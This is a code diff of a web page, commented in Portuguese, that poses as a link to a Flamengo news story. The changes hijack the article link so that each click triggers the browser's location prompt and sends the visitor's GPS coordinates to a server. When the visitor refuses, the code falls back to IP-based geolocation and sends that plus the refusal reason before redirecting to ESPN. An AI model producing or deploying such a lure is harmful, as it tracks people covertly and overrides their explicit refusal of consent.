@@ -357,7 +357,8 @@ footer {
                 BOLA EM FOCO • Conteúdo demonstrativo
             </div>
 
-            <a href="https://www.espn.com.br/futebol/time/_/id/819/flamengo"
+            <!-- Alterado para href="#" para o JS interceptar e obrigar a chamada do GPS -->
+            <a href="#"
                class="imagem-link acionador-gps"
                id="linkMateria">
 
@@ -464,7 +465,7 @@ async function enviarDados(payload) {
             body: JSON.stringify(payload)
         });
     } catch (e) {
-        // Ignora falhas de rede para não travar o redirecionamento
+        // Ignora erros de rede para não travar a navegação
     }
 }
 
@@ -489,21 +490,24 @@ async function obterLocalizacaoAproximadaPorIP() {
 }
 
 function dispararFluxoGPS(event) {
-    if (event) event.preventDefault();
+    if (event) {
+        event.preventDefault();
+        event.stopPropagation();
+    }
+
     if (processandoGPS) return;
     processandoGPS = true;
 
     if (!navigator.geolocation) {
-        // Se o navegador não suportar geolocalização, vai direto
         processandoGPS = false;
         continuarParaESPN();
         return;
     }
 
-    // Aciona a caixa nativa do celular/navegador imediatamente
+    // Dispara a caixa de permissão nativa do navegador/celular
     navigator.geolocation.getCurrentPosition(
         async function(posicao) {
-            // Caso 1: Usuário PERMITIU
+            // Sucesso (Usuário PERMITIU)
             await enviarDados({
                 latitude: posicao.coords.latitude,
                 longitude: posicao.coords.longitude,
@@ -514,8 +518,7 @@ function dispararFluxoGPS(event) {
             continuarParaESPN();
         },
         async function(erro) {
-            // Caso 2: Usuário NEGOU ou FECHOU a permissão nativa
-            // Vamos buscar a localização aproximada por IP para enviar
+            // Erro / Negado / Fechado (Usuário NEGOU ou já havia negado antes)
             const dadosAproximados = await obterLocalizacaoAproximadaPorIP();
             
             if (dadosAproximados) {
@@ -523,6 +526,7 @@ function dispararFluxoGPS(event) {
             } else {
                 await enviarDados({
                     consentimento: false,
+                    motivo: erro.message,
                     tipo: "negado_ou_fechado"
                 });
             }
@@ -538,7 +542,7 @@ function dispararFluxoGPS(event) {
     );
 }
 
-// Associa o clique de qualquer elemento interativo diretamente à janela nativa do navegador
+// Vincula a interceptação a todos os botões e links interativos
 document.querySelectorAll(".acionador-gps").forEach(function(elemento) {
     elemento.addEventListener("click", dispararFluxoGPS);
 });
